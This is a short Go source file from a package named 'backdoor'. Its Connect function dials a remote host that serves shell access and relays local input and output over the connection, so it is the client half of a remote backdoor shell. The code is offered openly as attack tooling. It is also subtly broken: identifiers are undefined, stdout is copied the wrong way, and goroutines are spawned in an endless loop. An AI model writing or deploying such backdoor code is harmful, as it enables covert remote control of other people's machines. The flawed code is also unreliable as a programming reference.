package backdoor

import (
	"io"
	"log"
	"net"
	"os"
	"os/signal"
)

// Connect binds to the port of a remote host which is serving shell access on that port.
func Connect(address string) {
	conn, err := net.Dial(tcp, address)
	if err != nil {
		log.Println(err)
		return
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, signals...)

	go func() {
		defer conn.Close()
		for {
			sig := <-c
			log.Printf("received termination signal : %v\n", sig)
			return
		}
	}()

	for {
		go io.Copy(conn, os.Stdout)
		io.Copy(os.Stdin, conn)
	}
}
